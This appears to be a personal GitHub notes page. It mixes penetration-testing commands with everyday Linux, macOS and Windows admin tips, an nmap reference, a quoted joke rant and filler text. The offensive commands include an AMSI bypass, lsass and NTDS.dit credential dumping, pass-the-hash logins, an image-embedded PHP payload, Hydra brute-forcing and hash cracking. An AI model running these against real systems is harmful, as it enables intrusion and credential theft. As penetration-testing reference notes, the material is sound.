# Mysterious Rantings...

// My Gists  
  
 https://gist.github.com/timsonner  
 
// New Gist Shortcut  
 
 https://gist.github.com  

// PSExec64  
https://download.sysinternals.com/files/PSTools.zip  
```
PsExec64.exe -s -i "\full\path\to\exe\create-kernel-service.exe"
```

// xfreerdp - dynamic resolution, shared folder, ignore cert  
```
xfreerdp /dynamic-resolution /cert:ignore /v:x.x.x.x /u:someuser /p:'spazzword' /drive:SHARE,<local file path>
xfreerdp /v:x.x.x.x /u:someuser /pth:xxxxxxxxxxxxxHASHxxxxxxxxxxxxxxx
```

Enable WinRM
```powershell
Enable-PSRemoting -SkipNetworkProfileCheck -Force
```
// Allow remote logon to WinRM service
```powershell
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType "DWORD"
```
-or-
```
winrm quickconfig
```

Get/Set WinRM service property to auto-start 
```powershell
Get-Service WinRM
Set-Service WinRM -StartMode Automatic
```

Kick holes in firewall
```powershell
New-NetFirewallRule -DisplayName "Open Port 5985 - WinRM" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow
New-NetFirewallRule -DisplayName "Open Port 5986 - WinRM" -Direction Inbound -Protocol TCP -LocalPort 5986 -Action Allow
```

Add target WinRM user to local 'Remote Management Users' group
```powershell
Add-LocalGroupMember -Group "Remote Management Users" -Member <username>
```

// evil-winrm
```
evil-winrm -i x.x.x.x -u someuser -p spazzword -P 5985
evil-winrm -i x.x.x.x -u vagrant -H xxxxxxxxxxxxxHASHxxxxxxxxxxxxxxx 
```

// AMSI bypass - https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/  
```
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

// Dump lsass using comsvcs.dll
```
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> lsass.dmp full 
```

// Ntdsutil - Dump NTDS.dit
```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
creates 3 files
```
- C:\Windows\NTDS\ntds.dit
- C:\Windows\System32\config\SYSTEM
- C:\Windows\System32\config\SECURITY
```

// PHP payload with Exiftool - Linux  

    exiftool -Comment='<?php phpinfo(); ?>' ./street-cat.jpg  
    
// Strip metadata with Exiftool - Linux  

```
exiftool -All= image.jpg
```
     
// Hashcat - Crack NTLM hash
```
hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt
```

// Hashcat - Crack the TGS Ticket hash

```bash
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

// Hashcat - Crack AS-REP hash

```
hashcat -a 0 -m 18200 as-rep.hash /path/to/wordlist
```

// Hashcat - Crack the NTLMv2 hash

```bash
hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

// Find processes running on a port - Windows  
 
     netstat -ano | findstr <port_number> 
    
// Get info of process - Windows  
 
     tasklist /FI "PID eq <process_id>"  

// Find files with SUID flag set
```
find / -type f -perm -04000 -ls 2>/dev/null
```

// get capabilities  
```
getcap -r / 2> /dev/null
```

// Find SMB shares on Windows host - Linux  
 
     smbclient -L <hostname or ip> -U <domain/user>
     
// Connect to SMB share on Windows host - Linux  
 
     smbclient //<hostname or ip>/Foo$ -U <domain/user>  

// Recursively download SMB share - Linux  

     smbget -R smb://<hostname>/anonymous
     
// Mount SMB share - Linux  
 
     mount -t cifs //<remote_host>/<share_name> ~/mnt/share -o username=<username>
 
// Find Apple Developer Certificate - MacOS  
 
     security find-identity -v -p codesigning
 
// Sign file with Developer Certificate - MacOS
 
     codesign -s "Apple Development: <Name> (<XXXXXXXXXX>)" foo.dylib
     
// Build Dynamic Library - GoLang
 
     go build -o foo.dylib -buildmode=c-shared -ldflags "-linkmode=external -w" foo.go  
     
// Build Dynamic Library - C  
 
     gcc -dynamiclib foo.c -o foo.dylib  
 
// Strip symbols from build process - GoLang
 
     go build -ldflags="-s -w" foo.go  

// Compile with all libraries necessary - GoLang  
 
     GOARCH=amd64 GOOS=linux CGO_ENABLED=0 go build -o go-gobserver  

// Initiate module for project - GoLang  
 ```
     go mod init foo  
 ```
    
// Bloodhound  
```powershell  
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```  

// Linux command equivalents - Windows

    copy
    where /r c:\ foo.bar
    type <File to cat>
    type > foo.bar
    net start foo
 
// Change NIC mac address - Windows  
 
     Get-NetAdapter
     Set-NetAdapter -Name "<Adapter name>" -MacAddress "<New MAC address>"  
     
// Change NIC mac address - Linux

    sudo ip link show
    sudo ip link set <interface> down
    sudo ip link set <interface> address <new MAC address>
    sudo ip link set <interface> up

// Change NIC mac address - MacOS

    ifconfig
    sudo ifconfig <interface> down
    sudo ifconfig <interface> hw ether <new MAC address>
    sudo ifconfig <interface> up
 
// Clear derived data for Xcode - MacOS  
 
     rm -rf ~/Library/Developer/Xcode/DerivedData/*  
     
// Windows key from firmware/BIOS - Linux 

    sudo strings /sys/firmware/acpi/tables/MSDM
    
// Add current user to vboxusers group - Linux

    sudo usermod -a -G vboxusers $USER

// DefectDojo Setup - Debian  

    git clone https://github.com/DefectDojo/django-DefectDojo &&  cd django-DefectDojo
    sudo apt install docker-compose
    sudo ./dc-build.sh
    sudo ./dc-up.sh postgres-redis 
    docker-compose logs initializer | grep "Admin password:"

// OpenVAS Setup - Debian
    
    sudo apt install openvas nsis postgresql
    sudo service postgresql start
    sudo systemctl start redis-server@openvas.service
    sudo runuser -u postgres -- /usr/share/gvm/create-postgresql-database
    sudo runuser -u _gvm -- gvmd --create-user=<name> --password=<password>
    sudo runuser -u _gvm -- greenbone-nvt-sync
    sudo runuser -u _gvm -- greenbone-feed-sync --type SCAP
    sudo runuser -u _gvm -- greenbone-feed-sync --type CERT
    sudo runuser -u _gvm -- greenbone-feed-sync --type GVMD_DATA
    sudo runuser -u _gvm -- gvm-manage-certs -a -f
    sudo gvm-check-setup 
    sudo chmod 666 /var/log/gvm/openvas.log
    sudo gvm-setup
    sudo runuser -u _gvm -- gvmd --user=admin --new-password=<password>
    sudo gvm-start
    sudo gvm-stop
    sudo gvm-start
    sudo gvm-setup  
    
// Connect to Ethernet - Linux

    ip link list
    ip link set <interface> up
    ip link show dev enp2s0

// Connect to wireless Method 1 - Linux

    iwctl
    station wlan0 scan
    station wlan0 get-networks
    station wlan0 connect "<Network ESSID>"
    
// Connect to wireless Method 2 - Linux
     
    iwconfig
    sudo ifconfig <INTERFACE> up
    sudo iwlist <INTERFACE> s | grep 'Cell\|Quality\|ESSID\|IEEE'
    sudo wpa_passphrase <ESSID> <PASSWORD> > /etc/wpa_supplicant.conf
    cat /etc/wpa_supplicant.conf
    wpa_supplicant -B -i <INTERFACE> -c /etc/wpa_supplicant.conf -D <driver>
    sudo iwconfig essid <ESSID>
    sudo dhclient wlp3s0

// Check hash - Windows  
 
    CertUtil -hashfile filename MD5
    CertUtil -hashfile filename SHA256

// Check hash - Linux  

    md5sum filename
    sha256sum filename

// Check hash - MacOS  

    md5 filename
    shasum -a 256 filename
    
// Unzip a disc image - Linux
 
     unxz -v <Path to image>.img.xz  

// VMware - Linux "Cannot open /dev/vmmon: No such file or directory"  
 
Generate key pair  
```
openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj "/CN=VMware/"
```

Sign VMWare drivers using generated keys:
```
/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmmon)

/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmnet)
```

// VirtualBox - "VBoxNetAdpCtl: Error while adding new interface: failed to open /dev/vboxnetctl: No such file or directory."  

Generate key pair:  
```
openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj "/CN=VirtualBox/"
```

Sign VirtualBox drivers  

```
/usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vboxdrv)
/usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vboxnetflt)
/usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vboxnetadp)
```

// Nvidia - nvidia-smi won't run  
Generate key pair  
```
openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj "/CN=Nvidia/"
```
// Nvidia sign drivers  
```
#!/bin/bash
# Script to sign Nvidia kernel modules

# To find the .ko files...
# sudo find /lib/modules/$(uname -r) -type f -name '*nvidia*.ko'

/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der /lib/modules/$(uname -r)/kernel/drivers/platform/x86/nvidia-wmi-ec-backlight.ko
/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der /lib/modules/$(uname -r)/kernel/drivers/usb/typec/altmodes/typec_nvidia.ko
/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der /lib/modules/$(uname -r)/updates/dkms/nvidia-current.ko
/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der /lib/modules/$(uname -r)/updates/dkms/nvidia-current-modeset.ko
/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der /lib/modules/$(uname -r)/updates/dkms/nvidia-current-drm.ko
/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der /lib/modules/$(uname -r)/updates/dkms/nvidia-current-uvm.ko
/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der /lib/modules/$(uname -r)/updates/dkms/nvidia-current-peermem.ko
```

Import public key to system's MOK list:  
```
mokutil --import MOK.der
``` 
Create password for this MOK enrollment request.
Reboot. Follow instructions to complete the MOK enrollment from UEFI console.  

// Install VirtualBox extension pack  
```
vboxmanage --version
curl https://download.virtualbox.org/virtualbox/<version number>/Oracle_VM_VirtualBox_Extension_Pack-<version number>.vbox-extpack
vboxmanage extpack install --replace Oracle_VM_VirtualBox_Extension_Pack-<version-number>.vbox-extpack 
```
System hardware model - Linux  
```
sudo dmidecode -t 1
```

Fix borked sound - Linux  
```
alsa force-reload
```
// The Harvester  as Docker container  
```  
docker run --rm -it --mount type=bind,source="$HOME/.theHarvester/api-keys.yaml",target="/app/api-keys.yaml" --entrypoint "/root/.local/bin/theHarvester" theharvester -d linkedin.com -b all
```  
-d : target domain
-b: data source  

// h8mail  
```  
h8mail -t emails.txt
```

# Nmap notes  

## Switches  

-O: Detect operating system  
-A: Aggressive  
-v: Verbose  
-vv: Double verbose  
-T\<int>: Timing  
-p \<int>: Port  
-p-: All ports  
-f: Fragment packets  
-Pn: Disable ping scan  
-iR \<int>: Random IP  
-n: No DNS resolve  
-R: reverse-DNS lookup for all hosts (live/dead)  
-S: Source IP  
-e: interface, such as tun1 or eth0  
-script=\<category or path to script>: Run script  
--script-updatedb: Update scripts.db  
--script-help "<string>": Script help  
--mtu \<int>: Maximum transmission unit size  
--data-length: Append random data to packet  
--scan-delay <time>ms: Delay between packets  
--badsum: Firewall check  
--dns-servers: Specify DNS servers  

## Scan types  

-sV: Identify services/versions scan.  
-sS: Syn "Half-open" aka "Stealth" scan   
-sU: UDP scan  
-sT: TCP Connect scan  
-sn: Disable port scan aka "Ping sweep"  
-sL: Test scan "List" targets  
-sN: TCP Null (All flags set to null)  
-sF: TCP FIN (FIN flag set to 1)  
-sX: TCP Xmas (URG, PUSH, FIN flags set to 1)  
-PS: TCP SYN Ping (SYN flag set tp 1)  
-PA: TCP ACK Ping (ACK flag set to 1)  
-PE: ICMP Echo (Type 8,0)  
-PP: ICMP Timestamp (Type 13,14)  
-PM: ICMP Address Mask (Type 17,18)  
-PR: ARP Ping *local subnet  
-PU: UDP Ping  
-P0: Ping off  

## Output  
-oA: All  
-oG: Grepable  
-oN: Normal  
-oX: XML  
-oS: s|\<rIpt kIddi3

## Examples  

    nmap -v -A scanme.nmap.org  
    nmap -v -sn 192.168.0.0/16 10.0.0.0/8  
    nmap -v -iR 10000 -Pn -p 80  
    nmap -sT --scan-delay 10s nmap.scanme.org
    nmap -sL -n 10.11.12.13/29  
    nmap -PR -sn 10.11.12.13/29 
    nmap localhost -p 1024-65535  
    nmap -T4 10.10.0-255.1-12
    nmap script=vuln  
    nmap -R --dns-servers 192.168.6.1  
    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>    
    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>  
    nmap --script=http-headers  
    nmap --script=http-title  
    nmap -S <fake source IP> -e tun1 -P0 -n <target IP>  
    
Script Help:  
nmap --script-help "smb-* and discovery"  
nmap --script-help "http-*" | grep -i "headers"  

Find script:
ls -l /usr/share/nmap/scripts/*dns*  
ls -l /usr/share/nmap/scripts/*smb*  

Download script:
sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse  

// Hydra  

SSH  

    hydra -l <username> -P /usr/share/wordlists/rockyou.txt 1<hostname> -t 4 ssh -V  

Web Portal  

     hydra -l <username> -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt <hostname> http-post-form "/admin/login/:username=^USER^&password=^PASS^:F=incorrect" -V  

// Tshark filters  

    tshark -r dnsexfil.pcap -Y "!(ip.src == 192.168.1.200) && !(tcp.analysis.retransmission || tcp.analysis.flags && tcp.flags.reset)" -T fields -e dns.qry.name  
    tshark -r dnsexfil.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name  

    tshark -r dnsexfil.pcap -Y "dns" -T fields -e dns.id  

    tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name 
     
// Links  
Hashcat-Cheatsheet - frizb/Hashcat-Cheatsheet  
https://github.com/frizb/Hashcat-Cheatsheet  

TCP/IP RFC 9293  
https://www.rfc-editor.org/rfc/rfc9293
 
Most Important Network Penetration Testing Checklist  
https://gbhackers.com/network-penetration-testing-checklist-examples/

Active Directory Exploitation Cheat Sheet by S1ckB0y1337  
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet  

Attacking Active Directory: 0 to 0.9  
https://zer1t0.gitlab.io/posts/attacking_ad/

NFS: The Deep Dive into Vulnerability Assessment and Exploitation Techniques  
https://medium.com/@Parag_Bagul/nfs-the-deep-dive-into-vulnerability-assessment-and-exploitation-techniques-41f19a380217
 
Malware Anti-VM Tricks  
https://www.cynet.com/attack-techniques-hands-on/malware-anti-vm-techniques/

How to use Markdown for writing technical documentation  
https://experienceleague.adobe.com/docs/contributor/contributor-guide/writing-essentials/markdown.html?lang=en  

### // RegEx match open tags except XHTML self-contained tags  
 
>You can't parse [X]HTML with regex. Because HTML can't be parsed by regex. Regex is not a tool that can be used to correctly parse HTML. As I have answered in HTML-and-regex questions here so many times before, the use of regex will not allow you to consume HTML. Regular expressions are a tool that is insufficiently sophisticated to understand the constructs employed by HTML. HTML is not a regular language and hence cannot be parsed by regular expressions. Regex queries are not equipped to break down HTML into its meaningful parts. so many times but it is not getting to me. Even enhanced irregular regular expressions as used by Perl are not up to the task of parsing HTML. You will never make me crack. HTML is a language of sufficient complexity that it cannot be parsed by regular expressions. Even Jon Skeet cannot parse HTML using regular expressions. Every time you attempt to parse HTML with regular expressions, the unholy child weeps the blood of virgins, and Russian hackers pwn your webapp. Parsing HTML with regex summons tainted souls into the realm of the living. HTML and regex go together like love, marriage, and ritual infanticide. The <center> cannot hold it is too late. The force of regex and HTML together in the same conceptual space will destroy your mind like so much watery putty. If you parse HTML with regex you are giving in to Them and their blasphemous ways which doom us all to inhuman toil for the One whose Name cannot be expressed in the Basic Multilingual Plane, he comes. HTML-plus-regexp will liquify the n​erves of the sentient whilst you observe, your psyche withering in the onslaught of horror. Rege̿̔̉x-based HTML parsers are the cancer that is killing StackOverflow it is too late it is too late we cannot be saved the transgression of a chi͡ld ensures regex will consume all living tissue (except for HTML which it cannot, as previously prophesied) dear lord help us how can anyone survive this scourge using regex to parse HTML has doomed humanity to an eternity of dread torture and security holes using regex as a tool to process HTML establishes a breach between this world and the dread realm of c͒ͪo͛ͫrrupt entities (like SGML entities, but more corrupt) a mere glimpse of the world of reg​ex parsers for HTML will ins​tantly transport a programmer's consciousness into a world of ceaseless screaming, he comes, the pestilent slithy regex-infection wil​l devour your HT​ML parser, application and existence for all time like Visual Basic only worse he comes he comes do not fi​ght he com̡e̶s, ̕h̵i​s un̨ho͞ly radiańcé destro҉ying all enli̍̈́̂̈́ghtenment, HTML tags lea͠ki̧n͘g fr̶ǫm ̡yo​͟ur eye͢s̸ ̛l̕ik͏e liq​uid pain, the song of re̸gular exp​ression parsing will exti​nguish the voices of mor​tal man from the sp​here I can see it can you see ̲͚̖͔̙î̩́t̲͎̩̱͔́̋̀ it is beautiful t​he final snuffing of the lie​s of Man ALL IS LOŚ͖̩͇̗̪̏̈́T ALL I​S LOST the pon̷y he comes he c̶̮omes he comes the ich​or permeates all MY FACE MY FACE ᵒh god no NO NOO̼O​O NΘ stop the an​*̶͑̾̾​̅ͫ͏̙̤g͇̫͛͆̾ͫ̑͆l͖͉̗̩̳̟̍ͫͥͨe̠̅s ͎a̧͈͖r̽̾̈́͒͑e n​ot rè̑ͧ̌aͨl̘̝̙̃ͤ͂̾̆ ZA̡͊͠͝LGΌ ISͮ̂҉̯͈͕̹̘̱ TO͇̹̺ͅƝ̴ȳ̳ TH̘Ë͖́̉ ͠P̯͍̭O̚​N̐Y̡ H̸̡̪̯ͨ͊̽̅̾̎Ȩ̬̩̾͛ͪ̈́̀́͘ ̶̧̨̱̹̭̯ͧ̾ͬC̷̙̲̝͖ͭ̏ͥͮ͟Oͮ͏̮̪̝͍M̲̖͊̒ͪͩͬ̚̚͜Ȇ̴̟̟͙̞ͩ͌͝S̨̥̫͎̭ͯ̿̔̀ͅ> 
	
-- <cite>https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags</cite>

### // Hipster Ipsum  
	
Taiyaki sriracha disrupt iPhone pop-up. Banjo keytar etsy craft beer, tonx sus narwhal raw denim lumbersexual stumptown. Tilde live-edge freegan keffiyeh, four dollar toast mukbang big mood XOXO shabby chic adaptogen sartorial street art. Jean shorts praxis iceland taiyaki portland swag ethical disrupt twee shoreditch. Put a bird on it gatekeep tilde prism, narwhal same tattooed truffaut mlkshk four loko artisan locavore hella beard. Jianbing truffaut organic pour-over cronut keffiyeh gatekeep stumptown paleo godard.

Poke seitan unicorn waistcoat big mood, PBR&B cold-pressed raw denim activated charcoal jianbing vegan DSA. Narwhal fashion axe cardigan flannel. Fam small batch pabst four loko tilde neutra lomo palo santo. Pinterest skateboard tumeric farm-to-table chillwave, tote bag authentic sustainable palo santo bitters organic fixie. Typewriter glossier sustainable tofu, gochujang cliche letterpress intelligentsia subway tile kitsch kogi succulents tote bag. Listicle whatever skateboard man bun selfies sus kombucha yuccie selvage shaman dreamcatcher mumblecore.

Roof party brunch mumblecore typewriter mixtape iceland tote bag, street art thundercats try-hard vaporware. Williamsburg tumblr glossier church-key cloud bread squid typewriter tote bag unicorn hoodie leggings. Yuccie succulents humblebrag, VHS shaman shoreditch master cleanse shabby chic lomo. Jianbing mlkshk tattooed, bicycle rights cardigan artisan skateboard meditation asymmetrical shoreditch. Banjo raclette waistcoat leggings. Yuccie irony portland listicle photo booth echo park cardigan jean shorts activated charcoal bodega boys chartreuse occupy shabby chic readymade.

Lyft sartorial glossier, chartreuse post-ironic palo santo gentrify. La croix pabst tote bag adaptogen master cleanse semiotics twee taxidermy truffaut cloud bread umami shaman messenger bag kombucha. Post-ironic bitters put a bird on it hot chicken tacos disrupt man braid forage thundercats coloring book pitchfork letterpress. You probably haven't heard of them pabst etsy synth lumbersexual. Banh mi sustainable chambray, occupy readymade mumblecore la croix schlitz cronut seitan. Palo santo semiotics tacos thundercats shaman synth succulents disrupt crucifix cray gentrify artisan neutra poke try-hard. Try-hard big mood stumptown pitchfork lomo typewriter.

Brooklyn kickstarter hot chicken vinyl taiyaki. Tonx DIY swag church-key waistcoat messenger bag fixie. Letterpress truffaut forage salvia, kale chips shaman tofu master cleanse migas fixie. Cronut keytar banjo af fixie helvetica food truck roof party bespoke. Yes plz fanny pack blog tote bag schlitz authentic ugh 8-bit hella organic. Organic seitan knausgaard flannel fam.

Dummy text? More like dummy thicc text, amirite? 

https://hipsum.co/

## Projects

<!-- <h1 align="center">Projects</h1> -->


<table bordercolor="#77a6fd">
  <tr>
    <td width="50%" valign="top">
      <h3 align="center">Sample 1</h3>
        <br />
        <a href="https://hipsum.co" target="_blank" >
            <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/golden-ratio-filler.jpg"/>
        </a>
        <br />
        <p align="center">
          
  <a href="https://hipsum.co">
    <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/logo-link.png"/>
  </a>  
  <a href="https://hipsum.co" target="_blank">
    <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/logo-link.png"/>
  </a>
      </p>
        <p><strong>Hipster/Ipsum</strong> - Four dollar toast meditation actually deep v, microdosing chicharrones pug coloring book direct trade. Skateboard thundercats before they sold out.</p>
    </td>
    <td width="50%" valign="top">
      <h3 align="center">Example 2</h3>
        <br />
        <a href="https://hipsum.co" target="_blank" >
            <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/golden-ratio-filler.jpg"/>
        </a>
        <br />
        <p align="center">
          
  <a href="https://hipsum.co">
    <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/logo-link.png"/>
  </a>  
  <a href="https://hipsum.co" target="_blank">
    <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/logo-link.png"/>
  </a>
      </p>
        <p><strong>Z/Z++</strong> - Four dollar toast meditation actually deep v, microdosing chicharrones pug coloring book direct trade. Skateboard thundercats before they sold out.</p>
    </td> 
  </tr>
  
  <td width="50%" valign="top">
      <h3 align="center">Project 3</h3>
        <br />
        <a href="https://hipsum.co" target="_blank" >
            <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/golden-ratio-filler.jpg"/>
        </a>
        <br />
        <p align="center">
          
  <a href="https://hipsum.co">
    <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/logo-link.png"/>
  </a>  
  <a href="https://hipsum.co" target="_blank">
    <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/logo-link.png"/>
  </a>
      </p>
        <p><strong>Wowowow</strong> - Four dollar toast meditation actually deep v, microdosing chicharrones pug coloring book direct trade. Skateboard thundercats before they sold out.</p>
    </td>
   <td width="50%" valign="top">
      <h3 align="center">Specimen 4</h3>
        <br />
        <a href="https://hipsum.co" target="_blank" >
            <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/golden-ratio-filler.jpg"/>
        </a>
        <br />
        <p align="center">
          
  <a href="https://hipsum.co">
    <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/logo-link.png"/>
  </a>  
  <a href="https://hipsum.co" target="_blank">
    <img src="https://github.com/timsonner/github-profile-markdown-snippets/blob/main/logo-link.png"/>
  </a>
      </p>
        <p><strong>FooBar</strong> - Four dollar toast meditation actually deep v, microdosing chicharrones pug coloring book direct trade. Skateboard thundercats before they sold out.</p>
    </td>
  </tr>
	
</table>
<hr/>
